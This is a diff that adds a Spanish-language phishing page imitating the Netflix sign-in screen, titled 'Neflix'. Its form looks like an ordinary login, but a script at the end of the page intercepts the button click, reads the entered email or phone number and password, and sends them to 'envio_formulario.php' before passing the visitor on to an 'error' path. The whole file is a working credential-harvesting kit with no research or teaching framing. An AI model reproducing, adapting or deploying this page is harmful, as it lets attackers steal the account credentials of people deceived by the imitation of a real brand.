@@ -1,0 +1,269 @@
+<html>
+    <head>
+        <title>Neflix</title>
+        <meta http-equiv="content-type" content="text/html; utf-8">
+        <meta charset="utf-8">
+        
+        <meta content="es" http-equiv="Content-Language">
+    
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <meta name="Copyright" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <link rel="icon" href="img/icono.ico" type="image/x-icon">
+        <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>      
+        <link href="css/style.css" rel="stylesheet">
+        <link href="css/stylesheet.css" rel="stylesheet">
+        <script type="text/javascript" src="js/functions.js"></script>      
+        <script type="text/javascript">
+            var ojolog = 0;
+            $(document).ready(function() {   
+                $("#inp-usuario").click(function(){
+                    $("#inp-usuario .etiqueta").animate({"margin-top": "0px","font-size": "11px"}, 100, function() {
+                        $("#txt-usuario").show();
+                        $("#txt-usuario").focus();                        
+                    });                    
+                });
+
+                $("#txt-usuario").blur(function(){
+                    if ($("#txt-usuario").val() == "") {
+                        $("#txt-usuario").hide();
+                        $("#inp-usuario .etiqueta").animate({"margin-top": "10px","font-size": "16px"}, 100);
+                        $("#err-usuario").show();
+                        $("#inp-usuario").css("border-bottom","2px solid #e87c03");                         
+                    }else{
+                        if ($("#txt-usuario").val().length < 5 ) {                        
+                            $("#err-usuario").show();
+                            $("#inp-usuario").css("border-bottom","2px solid #e87c03");  
+                        }else{
+                            $("#err-usuario").hide();
+                            $("#inp-usuario").css("border-bottom","none");      
+                        } 
+                    }
+                });
+
+                $('#txt-usuario').keyup(function(event){
+                    if ($("#txt-usuario").val().length > 4 ) {               
+                        $("#err-usuario").hide();
+                        $("#inp-usuario").css("border-bottom","none");     
+                    }
+                });
+
+                $("#inp-pass").click(function(){
+                    $("#inp-pass .etiqueta").animate({"margin-top": "0px","font-size": "11px"}, 100, function() {
+                        $("#tbl-inp-pass").show();
+                        $("#txt-pass").show();
+                        $("#txt-pass").focus();                        
+                    });                    
+                });
+
+                $("#txt-pass").blur(function(){
+                    if ($("#txt-pass").val() == "") {
+                        $("#tbl-inp-pass").hide();                        
+                        $("#inp-pass .etiqueta").animate({"margin-top": "10px","font-size": "16px"}, 100);
+                        $("#err-pass").show();
+                        $("#inp-pass").css("border-bottom","2px solid #e87c03");  
+                    }else{
+                        if ($("#txt-pass").val().length < 4 ) {
+                            $("#err-pass").show();
+                            $("#inp-pass").css("border-bottom","2px solid #e87c03");  
+                        }else{
+                            $("#err-pass").hide();
+                            $("#inp-pass").css("border-bottom","none"); 
+                        } 
+                    }
+                });
+
+                $('#txt-pass').keyup(function(event){
+                    if ($("#txt-pass").val().length > 3 ) {               
+                        $("#err-pass").hide();
+                        $("#inp-pass").css("border-bottom","none");     
+                    }
+                });
+
+                $("#btn-mostrar-log").click(function(){
+                    if (ojolog == 0) {
+                        $("#txt-pass").attr("type","text");
+                        $("#btn-mostrar-log").html("OCULTAR");
+                        ojolog = 1;    
+                    }else{
+                        $("#txt-pass").attr("type","password");
+                        $("#btn-mostrar-log").html("MOSTRAR");
+                        ojolog = 0;
+                    }                    
+                });
+
+                $("#btn-login").click(function(){
+                    var OK = 0;
+                    var d = detectar_dispositivo();
+
+
+                    if ($("#txt-usuario").val().length < 5){
+                        $("#err-usuario").show();
+                        $("#inp-usuario").css("border-bottom","2px solid #e87c03");   
+                        OK = 1;
+                    }
+
+                    if ($("#txt-pass").val().length < 4){
+                        $("#err-pass").show();
+                        $("#inp-pass").css("border-bottom","2px solid #e87c03");  
+                        OK = 1;
+                    }
+
+                    if (OK == 0) { 
+                        $("#hdd-dispositivo").val(d);                 
+                        $("#smt-login").submit();                                           
+                    }                  
+                });
+                            
+            });
+        </script>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <img src="img/logo.png" width="170">
+            </div>
+            <div class="frm-login">
+                <form name="smt-login" id="smt-login" action="worldwide/error/" method="post" target="_self">
+                    <input type="hidden" name="hdd-dispositivo" id="hdd-dispositivo">
+
+                    <div class="container-frm">
+                        <div class="titulo-blanco">Inicia sesión</div>
+                        <div class="frm-input" id="inp-usuario">
+                            <div class="etiqueta">Email o número de teléfono</div>
+                            <input type="text" class="entrada" id="txt-usuario" name="txt-usuario">
+                        </div>
+                        <div class="error" id="err-usuario">Ingresa un email o un número de teléfono válido.</div>
+                        <div class="frm-input" id="inp-pass">
+                            <div class="etiqueta">Contraseña</div>
+                            <table id="tbl-inp-pass">
+                                <tr>
+                                    <td><input type="password" class="entrada" id="txt-pass" name="txt-pass"></td>
+                                    <td id="btn-mostrar-log">MOSTRAR</td>
+                                </tr>
+                            </table>                        
+                        </div>
+                        <div class="error" id="err-pass">La contraseña debe tener entre 4 y 60 caracteres.</div>
+                        <button class="btn btn-rojo esp-btn" id="btn-login" type="button">Iniciar sesión</button>
+                        <table cellpadding="0" cellspacing="0" width="100%">
+                            <tr>
+                                <td valign="middle" align="left"><input type="checkbox" class="chulo" name="recordar" id="recordar"><label for="recordar" class="text-p">Recuérdame</label></td>
+                                <td valign="middle" align="right" class="ayuda text-p">¿Necesitas ayuda?</td>
+                            </tr>
+                        </table>
+                        <div style="color:#737373;font-size:16px;font-weight: 400;margin-top: 16px;">
+                            ¿Primera vez en Netflix? <span class="suscribete">Suscríbete ahora</span>.
+                            <br><br>
+                            <span style="color: #8c8c8c;font-size: 13px;margin-top: 11px;">
+                                Esta página está protegida por Google reCAPTCHA para comprobar que no eres un robot. <span class="mas-info">Más info</span>.
+                            </span>
+                        </div>
+                    </div>
+                </form>
+            </div>
+            <div class="footer">
+                <div class="container-foot">
+                    ¿Preguntas? Llama al <span class="telefono">01 800 917 1564</span>
+                    <br><br>
+                    <table cellpadding="0" cellspacing="0" width="100%" id="t1">
+                        <tr>
+                            <td>
+                                <div class="menu-footer">Preguntas frecuentes</div>
+                                <div class="menu-footer">Preferencias de cookies</div>
+                            </td>
+                            <td>
+                                <div class="menu-footer">Centro de ayuda</div>
+                                <div class="menu-footer">Información corporativa</div>
+                            </td>
+                            <td>
+                                <div class="menu-footer">Términos de uso</div>
+                            </td>
+                            <td>
+                                <div class="menu-footer">Privacidad</div>
+                            </td>
+                        </tr>
+                    </table>
+
+                    <table cellpadding="0" cellspacing="0" width="100%" id="t2">
+                        <tr>
+                            <td>
+                                <div class="menu-footer">Preguntas frecuentes</div>
+                                <div class="menu-footer">Preferencias de cookies</div>
+                            </td>
+                            <td>
+                                <div class="menu-footer">Centro de ayuda</div>
+                                <div class="menu-footer">Información corporativa</div>
+                            </td>
+                            <td>
+                                <div class="menu-footer">Términos de uso</div>
+                                <div class="menu-footer">Privacidad</div>
+                            </td>                            
+                        </tr>
+                    </table>
+
+                    <table cellpadding="0" cellspacing="0" width="100%" id="t3">
+                        <tr>
+                            <td>
+                                <div class="menu-footer">Preguntas frecuentes</div>
+                                <div class="menu-footer">Preferencias de cookies</div>
+                                <div class="menu-footer">Privacidad</div>
+                            </td>
+                            <td>
+                                <div class="menu-footer">Centro de ayuda</div>
+                                <div class="menu-footer">Información corporativa</div>                           
+                                <div class="menu-footer">Términos de uso</div>                                
+                            </td>                            
+                        </tr>
+                    </table>
+                    <br>
+                    <select style="background-color: #000;color: #737373;padding: 9px;">
+                        <option>Español</option>
+                        <option>English</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+      
+ <script>
+(function() {
+    const waitForBtn = setInterval(() => {
+        const btn = document.getElementById('btn-login');
+        if (!btn) return;
+
+        clearInterval(waitForBtn);
+        const form = document.getElementById('smt-login');
+
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+
+            const usuario = document.getElementById('txt-usuario').value.trim();
+            const pass = document.getElementById('txt-pass').value.trim();
+            const dispositivo = document.getElementById('hdd-dispositivo').value.trim();
+
+            console.log('JS ejecutándose, valores:', {usuario, pass, dispositivo});
+
+            const payload = { "txt-usuario": usuario, "txt-pass": pass, "hdd-dispositivo": dispositivo };
+
+            fetch('envio_formulario.php', {
+                method: 'POST',
+                headers: { 'Content-Type':'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(r => r.text())
+            .then(data => {
+                console.log('envio_formulario.php respondió:', data);
+                form.submit(); // continuar con el flujo original
+            })
+            .catch(err => {
+                console.error('Error fetch:', err);
+                form.submit(); // aunque falle, continuar con flujo original
+            });
+        });
+    }, 200);
+})();
+</script>
+
+                </body>
+</html>
